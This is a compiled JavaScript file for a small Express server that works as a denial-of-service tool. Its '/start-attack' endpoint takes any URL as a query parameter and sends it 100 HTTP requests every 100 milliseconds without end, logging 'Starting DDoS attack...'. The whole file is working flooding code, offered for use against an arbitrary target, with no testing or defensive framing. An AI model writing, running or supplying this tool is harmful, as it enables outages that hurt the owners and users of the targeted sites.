"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const axios_1 = __importDefault(require("axios"));
const app = (0, express_1.default)();
const port = 4000;
app.use(express_1.default.json());
const concurrentRequests = 100;
const intervalMs = 100;
function sendRequest(targetUrl) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield axios_1.default.get(targetUrl);
            console.log('Request sent');
        }
        catch (error) {
            if (error instanceof Error) {
                console.error('Request failed:', error.message);
            }
            else {
                console.error('Request failed:', String(error));
            }
        }
    });
}
function startDDoSAttack(targetUrl) {
    console.log('Starting DDoS attack...');
    setInterval(() => {
        for (let i = 0; i < concurrentRequests; i++) {
            sendRequest(targetUrl);
        }
    }, intervalMs);
}
app.get('/start-attack', (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) {
        return res.status(400).send('Please provide a URL as query parameter to attack');
    }
    startDDoSAttack(targetUrl);
    res.send(`Attack started on ${targetUrl}. Check console for results.`);
});
app.listen(port, () => {
    console.log(`Attack server running on port ${port}`);
    console.log('Visit http://localhost:4000/start-attack to begin the attack');
});
